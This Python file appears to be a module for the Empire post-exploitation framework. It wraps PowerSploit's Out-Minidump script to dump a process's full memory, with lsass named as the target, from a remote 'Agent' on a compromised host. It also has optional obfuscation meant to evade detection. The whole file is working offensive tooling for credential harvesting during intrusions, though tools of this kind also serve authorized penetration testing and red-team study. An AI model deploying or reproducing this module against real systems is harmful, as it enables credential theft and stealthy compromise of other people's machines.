from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers

class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Out-Minidump',

            'Author': ['@mattifestation'],

            'Description': ('Generates a full-memory dump of a process. Note: To dump another user\'s process, you must be running from an elevated prompt (e.g to dump lsass)'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ProcessName' : {
                'Description'   :   'Specifies the process name for which a dump will be generated.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ProcessId' : {
                'Description'   :   'Specifies the process ID for which a dump will be generated.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'DumpFilePath' : {
                'Description'   :   'Specifies the folder path where dump files will be written. Defaults to the current user directory.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Out-Minidump.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        
        scriptEnd = ""

        for option,values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if option == "ProcessName":
                        scriptEnd = "Get-Process " + values['Value'] + " | Out-Minidump"
                    elif option == "ProcessId":
                        scriptEnd = "Get-Process -Id " + values['Value'] + " | Out-Minidump"
        
        for option,values in self.options.items():
            if values['Value'] and values['Value'] != '':
                if option != "Agent" and option != "ProcessName" and option != "ProcessId":
                    scriptEnd += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
